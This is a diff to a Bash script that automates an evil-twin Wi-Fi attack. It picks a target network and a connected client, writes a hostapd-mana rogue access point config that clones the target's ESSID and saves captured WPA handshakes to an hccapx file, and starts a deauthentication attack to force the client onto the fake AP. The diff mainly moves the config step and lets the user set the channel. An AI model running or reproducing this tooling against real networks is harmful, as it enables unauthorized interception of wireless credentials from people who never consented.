@@ -359,44 +359,6 @@ TARGET_RAW_ESSID="${raw_essid_list[$essid_index]}"
 echo "Target ESSID selected: $TARGET_ESSID"
 sleep 0.2
 
-clear 
-# === Setup Python Virtual Environment ===
-VENV_DIR="venv_pmf"
-if [ ! -d "$VENV_DIR" ]; then
-    echo "📦 Membuat virtual environment Python..."
-    python3 -m venv "$VENV_DIR"
-fi
-
-echo "📥 Mengaktifkan virtual environment dan menginstal dependensi..."
-source "$VENV_DIR/bin/activate"
-
-# Buat file requirements.txt kalau belum ada
-REQ_FILE="requirements_pmf.txt"
-if [ ! -f "$REQ_FILE" ]; then
-    cat <<EOF > "$REQ_FILE"
-scapy
-EOF
-fi
-
-pip install --upgrade pip >/dev/null
-pip install -r "$REQ_FILE"
-
-echo "Melakukan pemindaian PMF..."
-PMF_RESULT=$(python3 detect_pmf.py --scan-once | grep -F "$TARGET_ESSID" | head -n 1)
-
-if [ -z "$PMF_RESULT" ]; then
-    echo "❌ ESSID '$TARGET_ESSID' tidak ditemukan saat scan PMF."
-else
-    SSID=$(echo "$PMF_RESULT" | cut -d '|' -f1)
-    BSSID=$(echo "$PMF_RESULT" | cut -d '|' -f3)
-    PMF_STATUS=$(echo "$PMF_RESULT" | cut -d '|' -f5)
-    echo "✅ ESSID: $SSID"
-    echo "    BSSID: $BSSID"
-    echo "    PMF Status: $PMF_STATUS"
-fi
-deactivate
-echo "Checking RSN parameters for target ESSID: $TARGET_ESSID"
-
 akms_types=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && frame contains \"$TARGET_ESSID\"" -T fields -e wlan.rsn.akms.type 2>/dev/null)
 
 if [[ -z "$akms_types" ]]; then
@@ -414,7 +376,7 @@ else
     echo "❌ Target only supports SAE. Attack cannot proceed."
     exit 1
 fi
-
+clear 
 echo ""
 echo "Re-examining wireless interfaces for Rogue AP and Monitor configuration..."
 
@@ -443,45 +405,7 @@ echo "Monitor Interface : $TARGET_MONITOR_IFACE"
 echo "Creating hccapx file: ${TARGET_ESSID}-handshake.hccapx"
 echo "[*] Disabling interfering services and interfaces..."
 
-# Stop NetworkManager (optional, depending on distro)
-if systemctl is-active --quiet NetworkManager; then
-    echo "[*] Stopping NetworkManager..."
-    sudo systemctl stop NetworkManager
-fi
-
-# Stop wpa_supplicant
-if systemctl is-active --quiet wpa_supplicant; then
-    echo "[*] Stopping wpa_supplicant..."
-    sudo systemctl stop wpa_supplicant
-fi
-
-# Bring down all wireless interfaces (except loopback)
-for iface in $(ls /sys/class/net/ | grep -v lo); do
-    echo "[*] Bringing down interface: $iface"
-    sudo ip link set $iface down
-done
 sleep 0.2
-CONFIG_FILE="hostapd-${TARGET_ESSID}.conf"
-echo "Creating configuration file: $CONFIG_FILE"
-
-cat > "$CONFIG_FILE" <<EOF
-interface=$TARGET_AP_IFACE
-driver=nl80211
-hw_mode=g
-channel=6
-ignore_broadcast_ssid=0
-ssid=$TARGET_ESSID
-wpa=2
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=12345678
-mana_wpaout=${TARGET_ESSID}-handshake.hccapx
-EOF
-
-
-echo "Configuration successfully created."
-
 echo "Identifying BSSID for target ESSID..."
 TARGET_BSSID=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid == \"$TARGET_ESSID\"" -T fields -e wlan.bssid | sort -u | head -n 1)
 
@@ -495,47 +419,77 @@ echo "Target BSSID: $TARGET_BSSID"
 echo "Initiating scan for clients connected to target BSSID..."
 
 CLIENT_SCAN_FILE="client-scan-$(date +%s)"
+
 echo "Beginning client scan and saving output to pcap: $CLIENT_SCAN_FILE"
-
 launch_terminal "sudo airodump-ng $TARGET_MONITOR_IFACE -w $CLIENT_SCAN_FILE --bssid $TARGET_BSSID --output-format pcap --manufacturer --wps --band abg"
-
-echo "Press CTRL+C in the client scanning terminal when sufficient data is collected."
+echo "Press CTRL+C in the client scanning terminal when sufficient data is collected. (please remember your target essid channel)" 
 read -p "Press [ENTER] after completing the client scan..."
 
+# Add prompt for the target ESSID channel
+read -p "Enter the target ESSID channel you remembered: " TARGET_ESSID_CHANNEL
+
 client_pcap=$(ls -t ${CLIENT_SCAN_FILE}-*.cap 2>/dev/null | head -n 1)
-
-if [[ -z "$client_pcap" ]]; then
-    echo "❌ No new client capture file found."
-    exit 1
+if [[ -z "$client_pcap" ]]; then 
+  echo "❌ No new client capture file found." 
+  exit 1 
 fi
-
 echo "Client pcap file: $client_pcap"
 
 mapfile -t client_list < <(tshark -r "$client_pcap" -Y "(wlan.fc.type_subtype >= 0x20 && wlan.fc.type_subtype <= 0x2f) && wlan.bssid == $TARGET_BSSID" -T fields -e wlan.sa | grep -v "$TARGET_BSSID" | sort -u)
-
-if [ ${#client_list[@]} -eq 0 ]; then
-    echo "❌ No clients found connected to target BSSID."
-    exit 1
+if [ ${#client_list[@]} -eq 0 ]; then 
+  echo "❌ No clients found connected to target BSSID." 
+  exit 1 
 fi
 
-echo "Potential Client List:"
-for i in "${!client_list[@]}"; do
-    echo "$i) ${client_list[$i]}"
+echo "Potential Client List:" 
+for i in "${!client_list[@]}"; do 
+  echo "$i) ${client_list[$i]}" 
 done
 
-client_index=$(get_number_input "Select target client (number): ")
+client_index=$(get_number_input "Select target client (number): ") 
 TARGET_CLIENT_MAC="${client_list[$client_index]}"
+echo "Target client selected: $TARGET_CLIENT_MAC" 
 
-echo "Target client selected: $TARGET_CLIENT_MAC"
+CONFIG_FILE="hostapd-${TARGET_ESSID}.conf" 
+echo "Creating configuration file: $CONFIG_FILE"
 
-echo "✅ Rogue AP interface is set correctly for hostapd-mana."
+# Use the user-provided channel instead of hardcoded value
+cat > "$CONFIG_FILE" <<EOF
+interface=$TARGET_AP_IFACE
+driver=nl80211
+hw_mode=g
+channel=$TARGET_ESSID_CHANNEL
+ignore_broadcast_ssid=0
+ssid=$TARGET_ESSID
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+mana_wpaout=${TARGET_ESSID}-handshake.hccapx
+EOF
 
+echo "Configuration successfully created."
 echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
-launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\""
+launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana "$CONFIG_FILE""
 
 sleep 3
 echo ""
 echo "Initiating deauthentication attack against target client in another terminal..."
+
+echo "Switching monitor interface $TARGET_MONITOR_IFACE to channel $TARGET_ESSID_CHANNEL..."
+sudo iwconfig $TARGET_MONITOR_IFACE channel $TARGET_ESSID_CHANNEL
+if [ $? -eq 0 ]; then
+    echo "✅ Successfully switched to channel $TARGET_ESSID_CHANNEL"
+else
+    echo "⚠️ Warning: Failed to switch to channel $TARGET_ESSID_CHANNEL"
+    read -rp "Do you want to continue anyway? [y/n]: " continue_choice
+    if [[ ! "$continue_choice" =~ ^[Yy]$ ]]; then
+        echo "Exiting..."
+        exit 1
+    fi
+fi
+
 DEAUTH_COUNT=5
 ATTEMPT=1
 
